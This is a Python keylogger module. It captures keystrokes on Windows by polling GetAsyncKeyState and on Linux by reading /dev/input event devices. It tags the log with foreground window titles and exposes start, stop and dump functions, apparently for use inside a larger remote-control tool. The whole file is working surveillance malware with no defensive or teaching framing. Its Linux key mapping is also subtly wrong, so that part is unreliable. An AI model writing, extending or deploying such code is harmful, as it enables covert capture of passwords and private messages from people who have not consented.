#!/usr/bin/env python3
"""Keylogger module — records keystrokes with window tracking."""
import time
import threading
import platform
import ctypes

_log = []
_running = threading.Event()

def start():
    """Start keylogger in background thread."""
    if _running.is_set():
        return b"already running"
    _running.set()
    threading.Thread(target=_run, daemon=True).start()
    return b"ok: keylogger started"

def stop():
    """Stop keylogger."""
    _running.clear()
    return b"ok: keylogger stopped"

def dump():
    """Return captured keystrokes and clear buffer."""
    data = "".join(_log).encode()
    _log.clear()
    return data

def _run():
    """Keylogger main loop."""
    system = platform.system()
    if system == "Windows":
        _run_windows()
    elif system == "Linux":
        _run_linux()

def _run_windows():
    """Windows keylogger using GetAsyncKeyState."""
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
    user32.GetAsyncKeyState.restype = ctypes.c_short
    user32.GetForegroundWindow.argtypes = []
    user32.GetForegroundWindow.restype = ctypes.c_void_p
    user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]

    prev = [False] * 256
    last_wnd = None
    SPECIAL = {0x08: "[BS]", 0x09: "\t", 0x0D: "\n", 0x1B: "[ESC]",
               0x2E: "[DEL]", 0x20: " "}

    while _running.is_set():
        # Track window
        wnd = user32.GetForegroundWindow()
        if wnd and wnd != last_wnd:
            title = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(wnd, title, 256)
            if title.value:
                _log.append(f"\n[WND] {title.value}\n")
            last_wnd = wnd

        shift = bool(user32.GetAsyncKeyState(0x10) & 0x8000)

        for vk in range(0x08, 0xFF):
            if 0x01 <= vk <= 0x06: continue
            s = user32.GetAsyncKeyState(vk)
            down = bool(s & 0x8000)
            if down and not prev[vk]:
                if vk in SPECIAL:
                    _log.append(SPECIAL[vk])
                elif 0x41 <= vk <= 0x5A:
                    _log.append(chr(vk) if shift else chr(vk + 32))
                elif 0x30 <= vk <= 0x39:
                    _log.append(chr(vk))
                elif 0x70 <= vk <= 0x7B:
                    _log.append(f"[F{vk - 0x6F}]")
            prev[vk] = down
        time.sleep(0.01)

def _run_linux():
    """Linux keylogger using /dev/input/event*."""
    import os
    import struct
    import glob

    # Find keyboard device
    devices = glob.glob("/dev/input/event*")
    if not devices:
        return

    # Try each device until we find one that gives key events
    for dev_path in devices:
        try:
            with open(dev_path, "rb") as dev:
                while _running.is_set():
                    event = dev.read(24)
                    if len(event) < 24:
                        break
                    # struct input_event { struct timeval time; unsigned short type; unsigned short code; int value; }
                    tv_sec, tv_usec, ev_type, code, value = struct.unpack("LLHHi", event)
                    if ev_type == 1 and value == 1:  # EV_KEY, key press
                        if code < 256:
                            _log.append(chr(code) if 32 <= code < 127 else f"[{code}]")
        except PermissionError:
            continue
        except:
            continue
